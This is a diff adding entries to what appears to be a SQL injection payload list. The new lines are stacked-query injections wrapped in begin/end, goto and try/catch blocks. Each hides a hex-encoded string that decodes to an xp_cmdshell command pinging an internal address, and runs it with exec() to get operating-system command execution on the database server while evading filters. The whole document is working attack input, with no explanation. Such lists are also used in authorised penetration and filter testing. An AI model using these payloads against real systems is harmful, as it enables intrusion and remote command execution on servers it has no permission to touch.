@@ -3,3 +3,8 @@
 username'exec master..xp_cmdshell'ping 127.0.0.1' -- and password = 'test'
 username'declare @s varchar (8000); ...
 username'DECLARE @find varchar(30) = 'Man%'
+'begin declare @s varchar (8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s); end	
+'goto label; label: declare @s varchar (8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'begin try select 1/0 end try begin catch declare @s varchar (8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end catch--
+'begin try declare @s varchar (8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end try begin catch print 1 end catch--
+
